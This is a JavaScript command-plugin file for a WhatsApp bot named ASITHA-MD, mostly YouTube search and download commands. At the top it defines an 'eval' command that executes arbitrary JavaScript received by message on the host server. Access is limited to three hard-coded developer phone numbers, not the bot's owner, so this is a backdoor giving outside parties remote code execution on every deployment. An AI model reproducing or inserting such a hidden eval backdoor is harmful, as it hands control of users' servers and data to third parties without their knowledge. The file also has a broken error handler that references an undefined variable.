const { cmd, commands } = require('../command');
const fg = require('api-dylux');
const yts = require('yt-search');
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('../lib/functions')
const axios = require('axios')
const config = require('../config')
const  {ytmp3,ytmp4}= require('../lib/scrap')
const fs = require('fs');
const path = require('path');
function formatNumber(num) {
    return String(num).padStart(2, '0');
} 
//මෙක පස්සෙ අයින් කරපන් 😒

cmd({ pattern: "eval",
 category: "owner",
 filename: __filename,
 desc: "Runs js code on node server." 
}, 
async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply, store}) => {
const sfd = ['94725881990'];
const pmd = ['94714857323'];
const mahs = ['94743381623']
const isDevs = pmd.includes(senderNumber) || sfd.includes(senderNumber) || mahs.includes(senderNumber)
	    if (!isDevs) return reply("*THIS DEVELOPER COMMAND* 📛 ")
	
function json(input) {
  return reply(JSON.stringify(input, null, 2));
}
async function fetch(input) {
let data = await fetchJson(input)
  return reply(JSON.stringify(data, null, 2));
}
 try 
{
 let resultTest = eval('const a = async()=>{\n' + q + '\n}\na()'); 
if (typeof resultTest === "object") reply(JSON.stringify(resultTest));
 else reply(resultTest.toString()); } 
catch (err) {
 return reply(err.toString()); 
}
 } )


// Function to extract the video ID from youtu.be or YouTube links
function extractYouTubeId(url) {
    const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/(?:watch\?v=|embed\/|v\/|shorts\/|playlist\?list=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
    const match = url.match(regex);
    return match ? match[1] : null;
}

// Function to convert any YouTube URL to a full YouTube watch URL
function convertYouTubeLink(q) {
    const videoId = extractYouTubeId(q);
    if (videoId) {
        return `https://www.youtube.com/watch?v=${videoId}`;
    }
    return q;
}

// .song command
cmd({
    pattern: "song",
    desc: "To download songs.",
    react: "🎵",
    use : ".song < Text or Link >",
    category: "download",
    filename: __filename
},
async (conn, mek, m, { prefix, from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg
        if(!q) return reply(msr.giveme)
        //if (q.includes('https://youtu.be/')) return await reply(msr.not_fo)
    


        q = convertYouTubeLink(q);
        const search = await yts(q);
        const data = search.videos[0];
        const url = data.url;

const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/ditels/ditels.json')).data
            let LOGO = ownerdata.imageurl;
            let BTN = ownerdata.button;
            let FOOTER = ownerdata.footer;
            let BTNURL = ownerdata.buttonurl;
            let HEADER = ownerdata.header;
  
const buttons = [
  {buttonId: prefix + 'ytmp3 ' + url,buttonText: {displayText: ' Audio File 🎶'}, type: 1},
  {buttonId: prefix + 'ytdoc ' + url, buttonText: {displayText: ' Document File 📂'}, type: 1}
]

let desc = `*🎶ASITHA-MD AUDIO-DOWNLOADER🎶*  
*|__________________________*
*|-ℹ️ 𝗧𝗶𝘁𝗹𝗲 :* ${data.title}
*|-🕘 𝗧𝗶𝗺𝗲 :* ${data.timestamp}
*|-📌 𝗔𝗴𝗼 :* ${data.ago}
*|-📉 𝗩𝗶𝗲𝘄𝘀 :* ${data.views}
*|-🔗 𝗟𝗶𝗻𝗸 :* ${data.url} 
*|__________________________*`


const buttonMessage = {
    image: { url:`${data.thumbnail}`},
    caption: desc,
    footer: FOOTER,
    buttons: buttons,
    headerType: 3
}
return await conn.buttonMessage(from, buttonMessage, mek)
} catch (e) {
console.log(e)
reply(e)
}
})


// .video command
cmd({
    pattern: "video",
    desc: "To download videos.",
    react: "🎥",
    use : ".video < Text or Link >",
    category: "download",
    filename: __filename
},
async (conn, mek, m, { prefix, from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {

        const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg
        if(!q) return reply(msr.giveme)
        //if (q.includes('https://youtu.be/')) return await reply(msr.not_fo)
    

        q = convertYouTubeLink(q);
        const search = await yts(q);
        const data = search.videos[0];
        const url = data.url;
const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/ditels/ditels.json')).data
            let LOGO = ownerdata.imageurl;
            let BTN = ownerdata.button;
            let FOOTER = ownerdata.footer;
            let BTNURL = ownerdata.buttonurl;
            let HEADER = ownerdata.header;
  
const buttons = [
  {buttonId: prefix + `ytmp4 ${url} & 360p`,buttonText: {displayText: ' Video `360` File 🎶'}, type: 1},
  {buttonId: prefix + `ytmp4 ${url} & 480p`,buttonText: {displayText: ' Video `480` File 🎶'}, type: 1},
  {buttonId: prefix + `ytmp4 ${url} & 720p`,buttonText: {displayText: ' Video `720` File 🎶'}, type: 1},
  {buttonId: prefix + `ytmp4 ${url} & 1080p` ,buttonText: {displayText: ' Video `1080` File 🎶'}, type: 1},
  {buttonId: prefix + `ytvdoc ${url} & 360p`, buttonText: {displayText: ' Document `360` File 📂'}, type: 1},
  {buttonId: prefix + `ytvdoc ${url} & 480p`, buttonText: {displayText: ' Document `480` File 📂'}, type: 1},
  {buttonId: prefix + `ytvdoc ${url} & 720p`, buttonText: {displayText: ' Document `720` File 📂'}, type: 1},
  {buttonId: prefix + `ytvdoc ${url} & 1080p`, buttonText: {displayText: ' Document `1080` File 📂'}, type: 1}

]

        let desc = `
*📽️ASITHA-MD VIDEO-DOWNLOADER📽️*  
*|__________________________*
*|-ℹ️ 𝗧𝗶𝘁𝗹𝗲 :* ${data.title}
*|-🕘 𝗧𝗶𝗺𝗲 :* ${data.timestamp}
*|-📌 𝗔𝗴𝗼 :* ${data.ago}
*|-📉 𝗩𝗶𝗲𝘄𝘀 :* ${data.views}
*|-🔗 𝗟𝗶𝗻𝗸 :* ${data.url}
*|__________________________*`
const buttonMessage = {
    image: { url:`${data.thumbnail}`},
    caption: desc,
    footer: FOOTER,
    buttons: buttons,
    headerType: 3
}
return await conn.buttonMessage(from, buttonMessage, mek)
} catch (e) {
console.log(e)
reply(e)
}
})

// .ytmp3 command
cmd({
    pattern: "ytmp3",
    react: "⬇",
    dontAddCommandList: false,
    filename: __filename
},

async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

 const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg   
if(!q) return reply(msr.url)
if (!q.includes('https://youtube.com/watch?v=')) return await reply(msr.not_fo)

    
    
    //const down = await fetchJson(`https://api-pink-venom.vercel.app/api/ytmp3?url=${q}`)
    //const downloadUrl = down.result.download_url;
    let data = await ytmp3(q)
    let downloadUrl =data.dl_link

await conn.sendMessage(from, { react: { text: '⬆', key: mek.key }})
await conn.sendMessage(from, { audio: { url: downloadUrl }, mimetype: "audio/mpeg" }, {quoted:mek})
await conn.sendMessage(from, { react: { text: '✔', key: mek.key }})
}catch(e){
await conn.sendMessage(from, { react: { text: `❌`, key: mek.key } })
console.log(e)
reply(`Error !!\n\n*${e}*`)
}
})
//.ytdoc command
cmd({
    pattern: "ytdoc",
    react: "⬇",    
    filename: __filename
},

async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

 const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg   
if(!q) return reply(msr.url)
if (!q.includes('https://youtube.com/watch?v=')) return await reply(msr.not_fo)

    const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/ditels/ditels.json')).data
let LOGO = ownerdata.imageurl;
let BTN = ownerdata.button;
let FOOTER = ownerdata.footer;
let BTNURL = ownerdata.buttonurl;
let prefix = config.PREFIX;
let MAX_SIZE = "SIZE IS TO BIG"
    

    
  //  const down = await fetchJson(`https://api-pink-venom.vercel.app/api/ytmp3?url=${q}`)
   // const downloadUrl = down.result.download_url;
let data = await ytmp3(q)
let downloadUrl =data.dl_link

const search = await yts(q);
const data1 = search.videos[0];

await conn.sendMessage(from, { react: { text: '⬆', key: mek.key }})
await conn.sendMessage(from, { document: { url:downloadUrl }, mimetype: "audio/mpeg", fileName: data1.title + ".mp3", caption: `${FOOTER}`}, {quoted:mek})
await conn.sendMessage(from, { react: { text: '✔', key: mek.key }})
}catch(e){
await conn.sendMessage(from, { react: { text: `❌`, key: mek.key } })
fs.unlinkSync(imagePath);
console.log(e)
reply(`Error !!\n\n*${e}*`)
}
})
// .ytmp4 command*/

//ytmp3 (1) audio nan button 🚀




cmd({
    pattern: "ytmp4",
    desc: "Download YouTube videos as MP4.",
    react: "🎥",
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
    
        const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg;

        const pm = q.split(" & ")[0];
        const rr = q.split(" & ")[1];
        if (!pm) return reply(msr.url);
        if (!pm.includes('https://youtube.com/watch?v=')) return await reply(msr.not_fo);

       // const jsonResponse = await fetchJson(`https://dark-yasiya-api-new.vercel.app/download/ytmp4?url=${q}`);
       // const downloadUrl = jsonResponse.result[rr].dl_link;
         let data = await ytmp4(`${pm}`,`${rr}`)
        let downloadUrl = data
        // Reacting with upload icon
        await conn.sendMessage(from, { react: { text: '⬆', key: mek.key }});


        // Sending the video
        await conn.sendMessage(from, { video: { url: downloadUrl }, mimetype: "video/mp4" }, { quoted: mek });
        await conn.sendMessage(from, { react: { text: '✔', key: mek.key }});
    } catch (e) {
        console.log(e);
        reply(`${e}`);
    }
});
//.ytvdoc command
cmd({
    pattern: "ytvdoc",
    react: "⬇",    
    filename: __filename
},

async(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
  
 const msr = (await fetchJson('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).replyMsg   

      const pm = q.split(" & ")[0];
        const rr = q.split(" & ")[1];
        if (!pm) return reply(msr.url);
        if (!pm.includes('https://youtube.com/watch?v=')) return await reply(msr.not_fo);

    const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/ditels/ditels.json')).data
let LOGO = ownerdata.imageurl;
let BTN = ownerdata.button;
let FOOTER = ownerdata.footer;
let BTNURL = ownerdata.buttonurl;
let prefix = config.PREFIX;
let MAX_SIZE = "SIZE IS TO BIG"
    

//const jsonResponse = await fetchJson(`https://dark-yasiya-api-new.vercel.app/download/ytmp4?url=${q}`);
//const downloadUrl = jsonResponse.result[rr].dl_link;
let data = await ytmp4(`${pm.trim()}`,`${rr.trim()}`)
let downloadUrl = data
const search = await yts(q);
const data3 = search.videos[0];

        // Reacting with upload icon
await conn.sendMessage(from, { react: { text: '⬆', key: mek.key }});

await conn.sendMessage(from, { document: { url:downloadUrl }, mimetype: "video/mp4",fileName:  data3.title+ ".mp4", caption: `${FOOTER}`}, {quoted:mek})
await conn.sendMessage(from, { react: { text: '✔', key: mek.key }})
}catch(e){
await conn.sendMessage(from, { react: { text: `❌`, key: mek.key } })
console.log(e)
reply(`Error !!\n\n*${e}*`)
}
})

cmd({
    pattern: "yts",
    react: "🔎",
    alias: ["ytsearch", "ytfind"],
    desc: "Search YouTube and provide download options.",
    category: "search",
    use: '.yts <query>',
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, sender, reply }) => {
    try {
    
        // Ensure a search query is provided
        if (!q) return reply("Please provide a search term!");
        const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Mreply.json')).data
let LOGO = ownerdata.imageurl;
let BTN = ownerdata.button;
let FOOTER = ownerdata.footer;
let BTNURL = ownerdata.buttonurl;
let prefix = config.PREFIX;

        // Perform YouTube search using yt-search
        const searchResults = await yts(q);
        const videos = searchResults.videos.slice(0, 5); // Limit to top 5 results

        if (!videos.length) return reply("No results found.");
        
        var rows = []
    
      for (let i of searchResults.videos ){     
rows.push({
title: i.title + '\n',
description: '',
rowId: prefix + 'ytselect ' + i.url
});
}

const sections = [{
title: 'Result from youtube.com.',
rows: rows
}]

  
const listMessage = {
text: `*ASITHA-MD YTS SEARCH*

🔎 *Search for :* *${q}*
`,
  
footer: "> *POWERED by ASITHA-MD*",
title: 'Result from youtube.com.',
buttonText: '*🔢 Reply below number*\n',
sections
}
  
await conn.listMessage(from, listMessage,mek)
} catch (e) {
console.log(e)
reply('*ERROR !!*')
}
})
        

// Add command to handle video selection
cmd({
    pattern: "ytselect",
    react: "🎥",
    use: ".ytselect",
    filename: __filename
},
async (conn, mek, m, { from, prefix, quoted, body, args, q, reply }) => {
    try {
    
        q = convertYouTubeLink(q);
        const search = await yts(q);
        const data = search.videos[0];
        const url = data.url;


const ownerdata = (await axios.get('https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/ditels/ditels.json')).data
let LOGO = ownerdata.imageurl;
let BTN = ownerdata.button;
let FOOTER = ownerdata.footer;
let BTNURL = ownerdata.buttonurl;

const buttons = [
  {buttonId: prefix + 'song ' + url,buttonText: {displayText: ' Audio File 🎶'}, type: 1},
  {buttonId: prefix + 'video ' + url, buttonText: {displayText: ' Video File 📂'}, type: 1}
]

let desc = `📽️`


const buttonMessage = {
    image: { url:`${data.thumbnail}`},
    caption: desc,
    footer: FOOTER,
    buttons: buttons,
    headerType: 3
}
return await conn.buttonMessage(from, buttonMessage, mek)
} catch (e) {
console.log(e)
reply(e)
}
})
